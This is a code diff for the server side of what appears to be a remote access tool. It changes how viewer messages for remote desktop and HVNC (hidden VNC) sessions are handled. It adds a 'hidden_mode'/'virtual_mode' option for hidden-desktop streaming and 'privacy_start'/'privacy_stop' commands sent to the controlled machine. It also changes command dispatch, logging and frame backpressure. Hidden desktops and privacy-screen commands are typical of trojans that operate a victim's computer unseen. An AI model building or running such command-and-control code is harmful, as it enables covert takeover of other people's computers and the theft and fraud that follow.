@@ -127,7 +127,10 @@ function getCaptureDllBytes(): Uint8Array | null {
   return null;
 }
 
-const VIEWER_BACKPRESSURE_BYTES = 2 * 1024 * 1024; // 2 MB
+const VIEWER_BACKPRESSURE_BYTES = Math.max(
+  64 * 1024,
+  Number(process.env.OVERLORD_MEDIA_VIEWER_BACKPRESSURE_BYTES || 512 * 1024),
+);
 
 type FrameBroadcastResult = {
   sent: boolean;
@@ -571,6 +574,12 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       }
       break;
     }
+    case "privacy_start":
+      sendDesktopCommand(target, "privacy_start", {});
+      break;
+    case "privacy_stop":
+      sendDesktopCommand(target, "privacy_stop", {});
+      break;
     case "mouse_move": {
       if (!state.isStreaming) break;
       const rawX = (payload as any).x;
@@ -768,6 +777,7 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
 
 type HVNCStreamingState = {
   isStreaming: boolean;
+  virtualMode: boolean;
   display: number;
   quality: number;
   codec: string;
@@ -776,7 +786,7 @@ type HVNCStreamingState = {
 };
 
 function defaultHVNCStreamingState(): HVNCStreamingState {
-  return { isStreaming: false, display: 0, quality: 90, codec: "", maxFps: 120, lastFps: 0 };
+  return { isStreaming: false, virtualMode: false, display: 0, quality: 90, codec: "", maxFps: 120, lastFps: 0 };
 }
 
 export const hvncStreamingState = new Map<string, HVNCStreamingState>();
@@ -1154,6 +1164,13 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
   logger.debug(`[hvnc] inbound viewer msg type=${payload.type} client=${clientId}`);
   switch (payload.type) {
     case "hvnc_start":
+      {
+        const virtualMode = (payload as any).virtual_mode === true || (payload as any).hidden_mode === true;
+        if (state.isStreaming && state.virtualMode !== virtualMode) {
+          sendHVNCCommand(target, "hvnc_stop", {});
+          state.isStreaming = false;
+          logger.debug(`[hvnc] restarting stream to change virtual_mode=${state.virtualMode} -> ${virtualMode}`);
+        }
       if (!state.isStreaming) {
         if ((payload as any).webrtc === true) {
           const streamPath = webrtcStreamPathFor(clientId, "hvnc");
@@ -1175,25 +1192,26 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         sendHVNCCommand(target, "hvnc_set_fps", { fps: clampDesktopFps(state.maxFps) });
         sendHVNCCommand(target, "hvnc_start", {
           autoStartExplorer: false,
+          ...(virtualMode ? { virtual_mode: true } : {}),
         });
         state.isStreaming = true;
+        state.virtualMode = virtualMode;
         hvncStreamingState.set(clientId, state);
-        logger.debug(`[hvnc] started streaming for client ${clientId}`);
+        logger.debug(`[hvnc] started streaming for client ${clientId} (virtual_mode=${virtualMode})`);
       } else {
         logger.debug(`[hvnc] ignoring duplicate hvnc_start for client ${clientId}`);
+      }
       }
       break;
     case "hvnc_stop": {
       const otherHvncViewers = sessionManager.getHvncSessionsForClient(clientId)
         .filter(s => s.id !== ws.data.sessionId);
       if (otherHvncViewers.length === 0) {
-        if (state.isStreaming) {
-          sendHVNCCommand(target, "hvnc_stop", {});
-          sendHVNCCommand(target, "webrtc_stop", { kind: "hvnc" });
-          state.isStreaming = false;
-          hvncStreamingState.set(clientId, state);
-          logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
-        }
+        sendHVNCCommand(target, "hvnc_stop", {});
+        sendHVNCCommand(target, "webrtc_stop", { kind: "hvnc" });
+        state.isStreaming = false;
+        hvncStreamingState.set(clientId, state);
+        logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
       } else {
         logger.debug(`[hvnc] ignoring hvnc_stop for client ${clientId} - ${otherHvncViewers.length} other viewer(s) still active`);
       }
@@ -1214,8 +1232,8 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "hvnc_set_quality": {
       const newQuality = Number(payload.quality) || 90;
       const newCodec = String(payload.codec || "").toLowerCase();
-      if (state.quality !== newQuality || state.codec !== newCodec) {
-        sendHVNCCommand(target, "hvnc_set_quality", { quality: newQuality, codec: newCodec });
+		sendHVNCCommand(target, "hvnc_set_quality", { quality: newQuality, codec: newCodec });
+		if (state.quality !== newQuality || state.codec !== newCodec) {
         state.quality = newQuality;
         state.codec = newCodec;
         hvncStreamingState.set(clientId, state);
@@ -1232,8 +1250,8 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       break;
     case "hvnc_set_fps": {
       const newMaxFps = clampDesktopFps((payload as any).fps);
+	  sendHVNCCommand(target, "hvnc_set_fps", { fps: newMaxFps });
       if (state.maxFps !== newMaxFps) {
-        sendHVNCCommand(target, "hvnc_set_fps", { fps: newMaxFps });
         state.maxFps = newMaxFps;
         hvncStreamingState.set(clientId, state);
         logger.debug(`[hvnc] set target fps=${newMaxFps}`);
@@ -1416,8 +1434,20 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
   }
 }
 
-export function sendHVNCCommand(target: ClientInfo, commandType: string, payload: any) {
-  target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
+export function sendHVNCCommand(target: ClientInfo | undefined, commandType: string, payload: any) {
+  if (!target) {
+    logger.warn(`[hvnc] send command skipped, target missing command=${commandType}`);
+    return false;
+  }
+  try {
+    logger.debug(`[hvnc] send command command=${commandType} client=${target.id} payload=${JSON.stringify(payload || {})}`);
+    target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
+    metrics.recordCommand(commandType);
+    return true;
+  } catch (err) {
+    logger.error("[hvnc] send command failed", err);
+    return false;
+  }
 }
 
 (globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
